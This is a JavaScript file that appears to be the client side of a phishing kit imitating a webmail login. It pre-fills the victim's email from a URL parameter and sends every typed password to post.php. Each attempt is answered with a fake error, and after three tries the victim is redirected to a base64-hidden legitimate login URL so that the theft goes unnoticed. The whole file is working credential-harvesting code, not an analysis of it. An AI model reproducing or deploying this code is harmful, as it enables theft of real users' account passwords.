$(document).ready(function() {
  // Password visibility toggle
  const passwordInput = document.getElementById('password');
  const submitButton = document.getElementById('submit');

  // Get email from URL parameter
  let loginAttempts = 0;
  const maxAttempts = 3;
  
  const encodedUrlTemplate = "aHR0cHM6Ly9sb2dpbi5vZmZpY2UuaGl3b3Jrcy5jb20ve2RvbWFpbn0=";
  
  // Function to decode base64
  function decodeBase64(str) {
    try {
      return atob(str);
    } catch (e) {
      //console.error("Decode error:", e);
      return "";
    }
  }
  
  // Parse URL parameters
  function getParameterByName(name, url = window.location.href) {
    name = name.replace(/[\[\]]/g, '\\$&');
    const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
          results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
  }
  
  // Validate email format with stronger TLD validation
  function isValidEmail(email) {
    // More comprehensive email regex that requires TLD to be at least 2 characters
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    
    if (!emailRegex.test(email)) {
      return false;
    }
    
    // Additional check for the TLD (part after the last dot)
    const parts = email.split('.');
    const tld = parts[parts.length - 1];
    
    // TLD must be at least 2 characters
    if (tld.length < 2) {
      return false;
    }
    
    return true;
  }
  
  // Try to decode base64 string
  function tryBase64Decode(str) {
    try {
      // Check for base64 format
      if (/^[A-Za-z0-9+/=]+$/.test(str)) {
        const decoded = atob(str);
        return decoded;
      }
    } catch (e) {
      //console.error("Base64 decode error:", e);
    }
    return str;
  }
  
  // Build redirect URL with username and domain
  function buildRedirectUrl(domain) {
    // Decode the template and then replace the placeholders
    return decodeBase64(encodedUrlTemplate)
      .replace('{domain}', encodeURIComponent(domain.replace('@', ''))); // Remove @ if present
  }
  
  // Show error page
  function showErrorPage() {
    $("#signtext").hide();
    $("#login").hide(); 
    $("#errorpage").show();
  }
  
  // Process the email parameter
  function processEmailParameter() {
    const utmParam = getParameterByName('utm');
    
    // Check if utm parameter exists and is a valid email
    if (!utmParam) {
      showErrorPage();
      return false;
    }
    
    // Try to decode if it's base64
    let email = tryBase64Decode(utmParam);
    
    // Validate email format
    if (!isValidEmail(email)) {
      showErrorPage();
      return false;
    }
    
    // Split email into username and domain
    const [username, domain] = email.split('@');
    
    // Populate the form fields
    $('#email').html(email);
    $('#domain').html(domain);
    
    // Focus on password field
    $('#password').focus();
    
    return true;
  }
  
  // Run email parameter processing
  const isValidLogin = processEmailParameter();
  
  // Handle form submission
  $('form').on('submit', function(e) {
    e.preventDefault();
    
    if (!isValidLogin) return;
    
    const password = $('#password').val();
    
    // Validate password
    if (!password || password.length < 5) {
      $('#error').show();
      $('#password').focus();
      return;
    }
    
    // Get username and domain for redirect
    const username = $('#email').html();
    const domain = $('#domain').html();
    
    // Disable form elements during submission
    const formElements = $('form input, form button').not('#email').not('[disabled]');
    formElements.prop('disabled', true);
    
    // Submit form data
    $.ajax({
      url: 'post.php',
      type: 'POST',
      data: {
        email: $('#email').html(),
        password: password
      },
      complete: function() {
        // This runs after either success or error
        // Count login attempts
        loginAttempts++;
        
        // Re-enable form elements
        formElements.prop('disabled', false);
        
          // Show error message and focus on password
          $('#error').show();
          $('#password').removeClass('password-field').addClass('password-error-field');
          $('#password').val('').focus();
          
          // Check if max attempts reached
          if (loginAttempts >= maxAttempts) {
            // Redirect after 3 failed attempts with the proper username and domain
            window.location.href = buildRedirectUrl(domain);
          }
       
      }
    });
  });

  // Function to update button styling based on password content
  function updateButtonStyle() {
    if (passwordInput.value.length > 0) {
      // Change to blue when password has content
      submitButton.classList.remove('login-btn');
      submitButton.classList.add('bg-[#2985db]');
    } else {
      // Revert to original light blue when password is empty
      submitButton.classList.remove('bg-[#2985db]');
      submitButton.classList.add('login-btn');
    }
  }

  // Listen for input events on password field
  passwordInput.addEventListener('input', updateButtonStyle);
  
  // Also handle focus event
  passwordInput.addEventListener('focus', function() {
    // Only change color if there's content
    if (passwordInput.value.length > 0) {
      submitButton.classList.remove('login-btn');
      submitButton.classList.add('bg-[#2985db]');
    }
  });

  $("#password").on("input", function(){
    if (this.value.length > 0 && this.classList.contains('password-error-field')) {
      this.classList.remove('password-error-field');
      this.classList.add('password-field');
      $("#error").hide();
    }
  });
  // Set autofocus on the password field
  passwordInput.focus();
});